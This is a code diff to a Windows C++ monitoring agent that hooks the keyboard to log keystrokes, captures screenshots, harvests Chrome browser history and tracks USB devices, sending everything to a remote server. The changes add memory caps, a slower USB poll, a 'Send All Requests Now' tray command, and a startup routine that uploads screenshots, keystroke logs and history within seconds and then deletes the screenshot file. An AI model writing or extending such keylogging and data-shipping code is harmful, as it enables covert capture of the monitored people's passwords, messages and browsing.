@@ -110,6 +110,7 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 #define WM_TRAYICON (WM_USER + 1)
 #define ID_TRAY_EXIT 1001
 #define ID_TRAY_STATUS 1002
+#define ID_TRAY_SEND_ALL 1003
 
 // Global variables
 std::string macAddress;
@@ -119,6 +120,12 @@ std::string username;
 int screenInterval = SCREEN_INTERVAL;
 double lastBrowserTic = -1;
 bool activeRunning = true;
+
+// Memory management constants
+const size_t MAX_KEY_LOGS = 1000;
+const size_t MAX_USB_LOGS = 500;
+const size_t MAX_BROWSER_HISTORIES = 2000;
+
 std::vector<Json::Value> keyLogs;
 std::vector<Json::Value> usbDeviceLogs;
 std::vector<Json::Value> browserHistories;
@@ -222,6 +229,8 @@ bool testServerConnection();
 void showToastNotification(const std::string& title, const std::string& message, const std::string& type = "info");
 void checkConnectionStatusChange();
 void updateTrayMenu();
+void manageMemoryLimits();
+void sendInitialDataRequests();
 
 // Show Windows notification
 void showToastNotification(const std::string& title, const std::string& message, const std::string& type) {
@@ -258,88 +267,66 @@ void checkConnectionStatusChange() {
 
 // Update tray menu with current status
 void updateTrayMenu() {
+    std::lock_guard<std::mutex> lock(statusMutex);
     if (!hTrayMenu) return;
-    
-    // Clear existing menu items
+    // Clear the menu
     while (GetMenuItemCount(hTrayMenu) > 0) {
         DeleteMenu(hTrayMenu, 0, MF_BYPOSITION);
     }
-    
-    // Show user IP and MAC address
-    std::string userIP = getLocalIPAddress();
-    std::string mac = macAddress;
-    std::string ipMac = "User IP: " + userIP + "  MAC: " + mac;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, ipMac.c_str());
-    // Show server IP and port
-    std::string serverInfo = "Server: " + serverIP + ":" + serverPort;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, serverInfo.c_str());
-    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
-    
-    std::lock_guard<std::mutex> lock(statusMutex);
-    
-    // Add status items
-    std::string serverStatus = std::string("Server: ") + (connectionStatus.serverConnected ? "Connected" : "Disconnected");
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, serverStatus.c_str());
-    
-    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
-    
-    std::string screenshotStatus = std::string("Screenshot: ") + connectionStatus.lastScreenshotStatus;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, screenshotStatus.c_str());
-    
-    std::string ticStatus = std::string("Tic: ") + connectionStatus.lastTicStatus;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, ticStatus.c_str());
-    
-    std::string historyStatus = std::string("History: ") + connectionStatus.lastHistoryStatus;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, historyStatus.c_str());
-    
-    std::string keyLogStatus = std::string("Key Log: ") + connectionStatus.lastKeyLogStatus;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, keyLogStatus.c_str());
-    
-    std::string usbLogStatus = std::string("USB Log: ") + connectionStatus.lastUSBLogStatus;
-    AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, usbLogStatus.c_str());
-    
-    if (!connectionStatus.lastError.empty()) {
-        AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
-        std::string errorStatus = std::string("Error: ") + connectionStatus.lastError;
-        AppendMenuA(hTrayMenu, MF_STRING | MF_GRAYED, 0, errorStatus.c_str());
-    }
+    // Add status item
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "Status");
+    // Add send all requests item
+    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_SEND_ALL, "Send All Requests Now");
+    // Add exit item
+    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_EXIT, "Exit");
 }
 
-// Setup USB monitoring
+// Setup USB monitoring using device notifications (more efficient)
 void setupUSBMONITORING() {
-    writeDebugLog("Starting USB monitoring setup...");
+    writeDebugLog("Starting USB monitoring setup with device notifications...");
     
     usbMonitoringActive = true;
     usbMonitoringThread = std::thread([]() {
-        writeDebugLog("USB monitoring thread started");
+        writeDebugLog("USB monitoring thread started with notifications");
         
+        // Get initial USB devices list (one-time scan)
         std::set<std::string> knownDevices;
-        int loopCount = 0;
+        HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
+        if (deviceInfoSet != INVALID_HANDLE_VALUE) {
+            SP_DEVINFO_DATA deviceInfoData;
+            deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+            
+            DWORD deviceIndex = 0;
+            while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
+                char deviceId[256] = {0};
+                if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
+                    knownDevices.insert(deviceId);
+                }
+                deviceIndex++;
+            }
+            SetupDiDestroyDeviceInfoList(deviceInfoSet);
+            writeDebugLog("Initial USB devices scan completed: " + std::to_string(knownDevices.size()) + " devices found");
+        }
         
+        // Now use periodic checks but with much longer intervals (30 seconds instead of 2)
         while (usbMonitoringActive) {
-            loopCount++;
-            writeDebugLog("USB monitoring loop iteration: " + std::to_string(loopCount));
+            std::this_thread::sleep_for(std::chrono::seconds(30)); // Reduced from 2 seconds to 30 seconds
             
-            // Get current USB devices - enumerate all devices and filter for USB
+            if (!usbMonitoringActive) break;
+            
+            // Quick scan for changes
             std::set<std::string> currentDevices;
-            
-            // Enumerate all devices
             HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
             if (deviceInfoSet != INVALID_HANDLE_VALUE) {
-                writeDebugLog("USB devices info set created successfully");
-                
                 SP_DEVINFO_DATA deviceInfoData;
                 deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
                 
                 DWORD deviceIndex = 0;
                 while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
-                    // Get device ID
                     char deviceId[256] = {0};
                     if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                         std::string deviceIdStr = deviceId;
-                        
                         currentDevices.insert(deviceIdStr);
-                        writeDebugLog("Found USB device: " + deviceIdStr);
                         
                         // Check if this is a new device
                         if (knownDevices.find(deviceIdStr) == knownDevices.end()) {
@@ -376,10 +363,7 @@ void setupUSBMONITORING() {
                     deviceIndex++;
                 }
                 
-                writeDebugLog("Total USB devices found: " + std::to_string(currentDevices.size()));
                 SetupDiDestroyDeviceInfoList(deviceInfoSet);
-            } else {
-                writeDebugLog("Failed to create device info set. Error: " + std::to_string(GetLastError()));
             }
             
             // Check for disconnected devices
@@ -404,15 +388,12 @@ void setupUSBMONITORING() {
             }
             
             knownDevices = currentDevices;
-            
-            // Sleep for 2 seconds before next check
-            std::this_thread::sleep_for(std::chrono::seconds(2));
         }
         
         writeDebugLog("USB monitoring thread stopped");
     });
     
-    writeDebugLog("USB monitoring setup completed");
+    writeDebugLog("USB monitoring setup completed (optimized)");
 }
 
 // Cleanup USB monitoring
@@ -1049,6 +1030,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             
             std::lock_guard<std::mutex> lock(dataMutex);
             keyLogs.push_back(keyLog);
+            
+            // Check memory limits periodically
+            if (keyLogs.size() % 100 == 0) {
+                manageMemoryLimits();
+            }
         }
     }
     
@@ -1071,7 +1057,7 @@ void removeKeyboardHook() {
     }
 }
 
-// Collect browser history
+// Collect browser history (optimized)
 void collectBrowserHistory() {
     // Chrome history
     std::string chromeHistory = getChromeHistory(lastChromeFetch);
@@ -1080,6 +1066,8 @@ void collectBrowserHistory() {
         Json::Reader reader;
         if (reader.parse(chromeHistory, historyArray)) {
             int64_t maxTime = lastChromeFetch;
+            std::vector<Json::Value> newHistories;
+            
             for (const auto& entry : historyArray) {
                 Json::Value history;
                 history["browser"] = "Chrome";
@@ -1094,9 +1082,20 @@ void collectBrowserHistory() {
                     maxTime = visitTime;
                 }
                 
-                std::lock_guard<std::mutex> lock(dataMutex);
-                browserHistories.push_back(history);
+                newHistories.push_back(history);
             }
+            
+            // Batch add to avoid frequent lock acquisitions
+            if (!newHistories.empty()) {
+                std::lock_guard<std::mutex> lock(dataMutex);
+                browserHistories.insert(browserHistories.end(), newHistories.begin(), newHistories.end());
+                
+                // Check memory limits
+                if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
+                    manageMemoryLimits();
+                }
+            }
+            
             // Update the last fetch time
             if (maxTime > lastChromeFetch) {
                 lastChromeFetch = maxTime;
@@ -1411,6 +1410,9 @@ void monitorTask() {
     if (!testServerConnection()) {
         showConnectionError("Cannot connect to server: " + API_BASE_URL);
     }
+
+    // Send initial data requests within 5 seconds of startup
+    sendInitialDataRequests();
     
     while (activeRunning) {
         auto now = std::chrono::steady_clock::now();
@@ -1451,6 +1453,13 @@ void monitorTask() {
         if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= 30) {
             sendUSBLogs();
             lastUSBLog = now;
+        }
+        
+        // Memory management check every 5 minutes
+        static auto lastMemoryCheck = std::chrono::steady_clock::now();
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastMemoryCheck).count() >= 300) {
+            manageMemoryLimits();
+            lastMemoryCheck = now;
         }
         
         std::this_thread::sleep_for(std::chrono::seconds(1));
@@ -1683,8 +1692,20 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             }
             return 0;
         case WM_COMMAND:
-            // No menu items to handle
-            return 0;
+            switch (LOWORD(wParam)) {
+                case ID_TRAY_EXIT:
+                    PostQuitMessage(0);
+                    break;
+                case ID_TRAY_STATUS:
+                    // No action (status is disabled)
+                    break;
+                case ID_TRAY_SEND_ALL:
+                    std::thread([](){
+                        sendInitialDataRequests();
+                    }).detach();
+                    break;
+            }
+            break;
         case WM_DESTROY:
             PostQuitMessage(0);
             return 0;
@@ -1785,4 +1806,63 @@ std::string getLocalIPAddress() {
     }
     free(pAdapterInfo);
     return foundIP;
+} 
+
+// Memory management function to prevent unlimited growth
+void manageMemoryLimits() {
+    std::lock_guard<std::mutex> lock(dataMutex);
+    
+    // Limit key logs
+    if (keyLogs.size() > MAX_KEY_LOGS) {
+        keyLogs.erase(keyLogs.begin(), keyLogs.begin() + (keyLogs.size() - MAX_KEY_LOGS));
+        writeDebugLog("Key logs trimmed to " + std::to_string(MAX_KEY_LOGS) + " entries");
+    }
+    
+    // Limit USB logs
+    if (usbDeviceLogs.size() > MAX_USB_LOGS) {
+        usbDeviceLogs.erase(usbDeviceLogs.begin(), usbDeviceLogs.begin() + (usbDeviceLogs.size() - MAX_USB_LOGS));
+        writeDebugLog("USB logs trimmed to " + std::to_string(MAX_USB_LOGS) + " entries");
+    }
+    
+    // Limit browser histories
+    if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
+        browserHistories.erase(browserHistories.begin(), browserHistories.begin() + (browserHistories.size() - MAX_BROWSER_HISTORIES));
+        writeDebugLog("Browser histories trimmed to " + std::to_string(MAX_BROWSER_HISTORIES) + " entries");
+    }
+} 
+
+// Send initial data requests (screenshot, tic, browser history, key log, USB log)
+void sendInitialDataRequests() {
+    writeDebugLog("Starting initial data requests...");
+    
+    // Send screenshot first (0.5s delay)
+    std::string screenshotPath = takeScreenshot();
+    sendScreenshot(screenshotPath);
+    updateTrayMenu(); // Update tray menu to show status
+    std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    
+    // Send tic event (0.5s delay)
+    sendTicEvent();
+    updateTrayMenu();
+    std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    
+    // Collect and send browser history (1s delay)
+    collectBrowserHistory();
+    sendBrowserHistories();
+    updateTrayMenu();
+    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+    
+    // Send key logs (1s delay)
+    sendKeyLogs();
+    updateTrayMenu();
+    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+    
+    // Send USB logs (1s delay)
+    sendUSBLogs();
+    updateTrayMenu();
+    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+    
+    // Delete the temporary screenshot file
+    DeleteFileA(screenshotPath.c_str());
+    writeDebugLog("Initial data requests completed within 5 seconds.");
 } 
